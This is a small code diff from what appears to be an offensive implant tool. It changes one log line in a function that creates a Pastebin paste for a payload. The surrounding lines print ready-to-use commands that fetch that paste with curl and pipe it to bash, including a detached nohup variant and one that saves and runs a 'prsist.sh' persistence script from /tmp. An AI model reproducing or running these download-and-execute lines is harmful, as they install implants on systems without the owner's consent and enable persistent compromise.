@@ -37,7 +37,7 @@ def generate_payload(implant_url):
 	info("Creating paste for payload deployment")
 	pastebin_url = create_paste(script)
 
-	info(f"Pastebin URL: {pastebin_url}")
+	info(f"Pastebin URL: {pastebin_url}\n")
 	success(f"timeout 30 curl -sSL {pastebin_url}|bash")
 	success(f"nohup bash -c 'curl -sSL {pastebin_url}|bash' &>/dev/null & disown")
 	success(f"cd /tmp;curl -sSLo prsist.sh {pastebin_url};chmod +x prsist.sh;./prsist.sh\n")
